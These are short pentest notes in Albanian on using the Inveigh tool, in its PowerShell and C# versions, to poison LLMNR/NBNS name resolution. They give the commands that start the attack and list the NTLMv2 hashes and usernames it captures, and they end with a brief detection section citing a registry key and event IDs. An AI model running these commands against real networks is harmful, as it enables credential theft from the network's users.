
### ⚙️ _Përdorimi i Inveigh (PowerShell)_

1. **Importo skriptin:**
2. https://github.com/Kevin-Robertson/Inveigh

```bash
Import-Module .\\Inveigh.ps1
```

1. Shiko opsionet e komandës:

```bash
(Get-Command Invoke-Inveigh).Parameters
```

1. **Nis sulmin me output në console dhe file:**

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

---

### 💻 **InveighZero (C# Version)**

1. Ekzekuto versionin .exe të Inveigh:

```powershell
.\Inveigh.exe
```

1. Komandat brenda Inveigh.exe për të marrë hashet:

```bash
# Shikojm hashet e kapura
GET NTLMV2UNIQUE

# Shikojm cfare username kemi mbledhur
GET NTLMV2USERNAMES
```


---

### 🧪 **Poisoning Detection & System Monitoring**

- Monitoro për ndryshime në multicast DNS/LLMNR settings:

```powershell
Registry path:
HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient
Key:
EnableMulticast
```

**Event IDs që ndihmojnë në deteksion:**

- [🆔 4697 – Install of a service](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697)
- [🆔 7045 – A service was installed](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html)